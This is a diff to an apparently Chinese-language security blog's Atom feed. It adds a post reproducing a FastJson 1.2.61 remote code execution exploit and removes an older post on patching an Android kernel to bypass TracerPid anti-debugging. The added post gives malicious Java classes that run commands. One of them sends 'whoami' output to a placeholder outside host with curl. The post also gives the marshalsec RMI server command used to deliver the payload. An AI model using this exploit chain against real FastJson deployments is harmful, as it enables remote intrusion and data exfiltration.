@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2019-10-11T02:16:20.073Z</updated>
+  <updated>2019-10-14T08:46:38.187Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>FastJson 1.2.61 RCE</title>
+    <link href="/2019/10/FastJson-1-2-61-RCE/"/>
+    <id>/2019/10/FastJson-1-2-61-RCE/</id>
+    <published>2019-10-14T08:39:05.000Z</published>
+    <updated>2019-10-14T08:46:38.187Z</updated>
+    
+    <content type="html"><![CDATA[<p>必备的jar包和Java 1.8.U20：</p><pre><code>fastjson-1.2.61.jarcommons-configuration2-2.0.jarcommons-lang3-3.3.2.jarcommons-logging-1.2.jar</code></pre><p>此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。</p><p><img src="https://i.loli.net/2019/10/14/4br1TCwMXgzRdeO.png" alt="1571032870844.png"></p><p>此处使用RMI来做测试。同时创建一个恶意类，使用已经提供的恶意Java文件。</p><pre><code>import java.io.BufferedReader;import java.io.InputStreamReader;public class ExportObject {    public ExportObject() throws Exception {        Process proc = Runtime.getRuntime().exec(&quot;calc&quot;);        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));        StringBuffer sb = new StringBuffer();        String line;        while((line = br.readLine()) != null) {            sb.append(line).append(&quot;\n&quot;);        }        String result = sb.toString();        Exception e = new Exception(result);        throw e;    }    public static void main(String[] args) throws Exception {    }}</code></pre><p>当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class Exploit {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public Exploit() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://x.x.x.x/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://x.x.x.x/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>启动一个RMI监听服务</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExportObject</code></pre><p>开启一个http服务</p><pre><code>python -m SimpleHTTPServer</code></pre><p>运行IDEA中的POC，发现可以弹出计算器。</p><p><img src="https://i.loli.net/2019/10/14/4ipBcDsJgeIR8Av.png" alt="2"></p><p>HTTP服务上也有请求的记录。</p><p><img src="https://i.loli.net/2019/10/14/jtrKFRiJhPX9dyM.png" alt="1571042112558.png"></p><p>POC地址：<a href="https://github.com/jas502n/fastjson-1.2.61-RCE" target="_blank" rel="noopener">https://github.com/jas502n/fastjson-1.2.61-RCE</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;必备的jar包和Java 1.8.U20：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;fastjson-1.2.61.jar
+commons-configuration2-2.0.jar
+commons-lang3-3.3.2.jar
+commons-logging-1.2.jar
+&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Windows Notes</title>
@@ -469,29 +497,6 @@ int fun1()
     
     
       <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>逆向修改手机内核，绕过反调试</title>
-    <link href="/2019/04/%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E6%89%8B%E6%9C%BA%E5%86%85%E6%A0%B8%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
-    <id>/2019/04/逆向修改手机内核，绕过反调试/</id>
-    <published>2019-04-02T05:59:49.000Z</published>
-    <updated>2019-07-26T09:56:34.187Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="逆向修改手机内核，绕过反调试"><a href="#逆向修改手机内核，绕过反调试" class="headerlink" title="逆向修改手机内核，绕过反调试"></a>逆向修改手机内核，绕过反调试</h3><p>Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。</p><h4 id="一、-提取-zImage-内核文件"><a href="#一、-提取-zImage-内核文件" class="headerlink" title="一、  提取 zImage 内核文件"></a>一、  提取 zImage 内核文件</h4><p>查找boot文件位置</p><pre><code>find / | grep bootcd /dev/block/platform/7824900.sdhci/by-name/将boot导出为boot.imgdd if=/dev/block/mmcblk0p22 of=/sdcard/boot.img</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185489216.png" alt="1554185489216"></p><p>把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。</p><pre><code>adb pull /sdcard/boot.img d:\a</code></pre><p>然后下载bootimg解压boot文件：</p><pre><code>git clone https://github.com/pbatard/bootimg-tools.gitmake</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185769689.png" alt="1554185769689"></p><p>此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185817995.png" alt="1554185817995"></p><p>提取原始zImage</p><p>将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185942154.png" alt="1554185942154"></p><p>修改完成后，解压缩文件，提取zImage</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185966036.png" alt="1554185966036"></p><h4 id="二、-提位、修改关键代码"><a href="#二、-提位、修改关键代码" class="headerlink" title="二、  提位、修改关键代码"></a>二、  提位、修改关键代码</h4><p>zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可）</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186082956.png" alt="1554186082956"></p><p>点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186088780.png" alt="1554186088780"></p><p>原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。</p><pre><code>echo 0 &gt; /proc/sys/kernel/kptr_restrict关闭符号屏蔽再输入以下命令查看这两函数的地址cat /proc/kallsyms |grep proc_pid_statuscat /proc/kallsyms |grep __task_pid_nr_ns</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063821.png" alt="1554187063821"></p><p>为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30  09)。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186414392.png" alt="1554186414392"></p><p>其对应的Hex窗口修改为如下所示：</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186447080.png" alt="1554186447080"></p><p>使用<code>gzip -n -f -9 zImage</code>压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。</p><p>修改完成后，刷入手机，利用SDK自带的fastboot。</p><pre><code>adb reboot bootloader   # 启动fastboot模式fastboot flash boot boot.img   #刷入boot分区fastboot reboot  #重启</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186828423.png" alt="1554186828423"></p><h4 id="调试查看"><a href="#调试查看" class="headerlink" title="调试查看"></a>调试查看</h4><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063866.png" alt="1554187063866"></p><p>如想使用修改函数操作指令的方式可以参考原作者方式：</p><p>1、<a href="https://www.jianshu.com/p/91aa37f3a972" target="_blank" rel="noopener">逆向修改手机内核，绕过反调试</a></p><p>2、<a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/" target="_blank" rel="noopener">逆向修改内核，绕过TracerPID反调试</a></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;a href=&quot;#逆向修改手机内核，绕过反调试&quot; class=&quot;headerlink&quot; title=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;/a&gt;逆向修改手机内核，绕过反调试&lt;/h3&gt;&lt;p&gt;Android 应用反调试里最常用的一种反调
-      
-    
-    </summary>
-    
-    
-      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
     
   </entry>
   
